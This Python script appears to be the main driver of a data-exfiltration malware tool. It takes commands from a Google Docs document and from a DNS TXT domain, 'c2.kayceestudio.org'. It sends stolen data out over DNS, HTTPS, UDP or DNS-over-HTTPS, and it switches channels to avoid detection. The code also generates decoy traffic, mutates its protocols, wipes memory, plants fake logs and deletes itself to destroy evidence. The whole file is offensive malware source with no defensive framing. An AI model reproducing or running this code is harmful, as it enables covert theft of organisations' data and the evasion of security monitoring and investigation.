from ai.rhlf import RLAgent, ExfiltrationEnv
from ai.genetic import GeneticMutator
from ai.markov_chain import MarkovPredictor
from protocols.dns_traffic_simulation import DNSProtocol
from protocols.https_mimic import HTTPSProtocol
from protocols.udp import UDPProtocol
from security.memory_exfil import SecureMemoryExfiltrator
from c2.c2_google_docs import GoogleDocsC2
from c2.c2_dns_txt import DNSC2
from security.fake_activity import FakeActivity
from security.fake_logs import FakeLogs
from security.honeytokens import Honeytokens
from protocols.doh_tunnel import DoHProtocol
import time
import sys
import os
import random

# Google Docs C2 Settings
DOC_ID = "1ngLlijVCAuNEwv3FKzi3BI3VM6F9wKdUqTu4b73O26E"
google_c2 = GoogleDocsC2(DOC_ID)

# DNS TXT C2 Settings (Backup)
C2_DOMAIN = "c2.kayceestudio.org"
dns_c2 = DNSC2(C2_DOMAIN)

COMMAND = "exfiltrate data"
SERVER_IP = "192.168.1.100"

# AI Components
env = ExfiltrationEnv()
rl_agent = RLAgent(env)
mutator = GeneticMutator()
markov = MarkovPredictor(decay_factor=0.95, confidence_threshold=0.7)
memory_exfil = SecureMemoryExfiltrator()
fake_activity = FakeActivity()
fake_logs = FakeLogs()
honeytokens = Honeytokens()

# Deploy honeytokens before starting exfiltration
honeytokens.deploy_honeytokens()

# Define protocol categories
protocol_categories = {
    "USE_DNS": [DNSProtocol(COMMAND, SERVER_IP)],
    "USE_HTTPS": [HTTPSProtocol(COMMAND, SERVER_IP)],
    "USE_UDP": [UDPProtocol(COMMAND, SERVER_IP)],
    "USE_DOH": [DoHProtocol(COMMAND)]
}

def get_c2_command():
    """
    Fetch command from Google Docs C2 first. If it fails, switch to DNS TXT C2.
    """
    try:
        command = google_c2.get_latest_command()
        if command:
            print("📡 Google Docs C2 Active")
            return command
    except Exception as e:
        print(f"⚠️ Google Docs C2 Failed: {e} - Switching to DNS TXT")

    try:
        command = dns_c2.get_latest_command()
        if command:
            print("🌐 Using DNS TXT C2 (Backup)")
            return command
    except Exception as e:
        print(f"❌ DNS TXT C2 Failed: {e} - No C2 Available")

    return None  # No valid command received

def self_destruct():
    """
    Deletes the script itself, clears logs, and removes evidence.
    """
    script_path = os.path.abspath(sys.argv[0])
    print(f"🧨 Self-Destructing: {script_path}")
    
    try:
        # Inject fake logs before deletion
        fake_logs.write_fake_logs()

        # Delete script
        os.remove(script_path)
        print("✅ Script deleted successfully!")
    except Exception as e:
        print(f"⚠️ Self-Destruction Failed: {e}")

def switch_protocol(data):
    """
    AI-driven exfiltration loop:
    - Detects monitoring attempts.
    - Adjusts exfiltration parameters dynamically.
    - Switches protocols automatically.
    """
    last_command = None

    while True:
        # Step 1: Check for Honeytoken access BEFORE exfiltration starts

        # Honeytoken monitoring is now event-driven and runs in the background.
        print("👀 Honeytoken monitoring started (event-driven).")


        # Step 2: Fetch latest C2 command (Google Docs first, DNS TXT if fails)
        command = get_c2_command()

        if command and command != last_command:
            print(f"📡 Received New C2 Command: {command}")
            last_command = command

            if command in protocol_categories:
                selected_category = command
                print(f"🎯 C2 Selected Protocol: {selected_category}")
            else:
                print(f"⚠️ Unknown command: {command}, defaulting to USE_DNS.")
                selected_category = "USE_DNS"

            # Get available protocols for this category
            available_protocols = protocol_categories[selected_category]

            # Validate protocol selection
            if not available_protocols:
                print("🚨 No available protocols in this category! Exiting.")
                return

            # AI chooses the best protocol
            best_protocol_name = (
                markov.predict_next(selected_category)
                if len(available_protocols) > 1
                else available_protocols[0].name
            )

            print(f"🔄 Markov Selected: {best_protocol_name}")

            # Ensure the selected protocol actually exists
            protocol = next((p for p in available_protocols if p.name == best_protocol_name), None)

            if protocol is None:
                print(f"🚨 ERROR: No protocol found matching '{best_protocol_name}'! Using default.")
                protocol = available_protocols[0]

            # Adaptive Stealth Mode - Change Protocol if Detection is Likely
            detection_risk = random.uniform(0, 1)
            if detection_risk > 0.7:
                print("🚨 High Detection Risk! Switching to Adaptive Stealth Mode.")
                selected_category = "USE_DOH" if selected_category != "USE_DOH" else "USE_HTTPS"

                available_protocols = protocol_categories[selected_category]
                best_protocol_name = available_protocols[0].name  # Fallback to first available protocol

                print(f"🔄 AI Adjusted Protocol to: {best_protocol_name}")

            # Generate Decoy Traffic Before Exfiltration
            fake_activity.generate_decoy_traffic()

            # Execute Exfiltration
            success = protocol.transmit(memory_exfil.read_data())
            reward = 1 if success else -1
            rl_agent.update_q_table(list(protocol_categories.keys()).index(selected_category), reward)

            # Update Markov Chain transition history
            markov.update(selected_category, protocol.name, success)

            # Mutate protocol if detected
            if not success:
                mutated_protocol = mutator.mutate_protocol(protocol)
                print(f"🔄 Switching to Mutated Protocol: {mutated_protocol.name}")
                protocol = mutated_protocol  

            print(f"✅ Using Protocol: {protocol.name} - {'Success' if success else 'Blocked'}")

            # Wipe memory after transmission
            memory_exfil.secure_wipe_memory()
        
        time.sleep(10)  # Poll C2 every 10 seconds

if __name__ == "__main__":
    test_data = "Sensitive corporate financial data"
    switch_protocol(test_data)

    # Wait before deleting to allow logs to be seen
    time.sleep(10)
    self_destruct()